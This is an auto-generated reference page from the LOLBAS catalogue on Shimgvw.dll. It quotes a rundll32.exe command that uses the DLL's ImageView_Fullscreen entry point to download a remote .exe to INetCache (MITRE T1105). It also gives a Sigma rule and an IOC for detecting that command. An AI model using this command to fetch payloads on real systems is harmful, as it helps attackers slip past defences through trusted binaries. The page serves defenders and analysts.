---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Shimgvw.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `shimgvw.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Shimgvw.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shimgvw.dll](../../tools/windows/shimgvw.dll.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | shimgvw.dll |
| name | Shimgvw.dll |
| type | tool |
| source | lolbas |
| url | https://twitter.com/eral4m/status/1479080793003671557 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@eral4m'
  Person: Eral4m
Author: Eral4m
Commands:
- Category: Download
  Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
  Description: Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used
    with entrypoint 'ImageView_FullscreenA'.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2021-01-06
Description: Photo Gallery Viewer
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line
Full_Path:
- Path: c:\windows\system32\shimgvw.dll
- Path: c:\windows\syswow64\shimgvw.dll
Name: Shimgvw.dll
Resources:
- Link: https://twitter.com/eral4m/status/1479080793003671557
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Shimgvw.yml
```

## Detection / Analysis Notes

```text
IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line
```
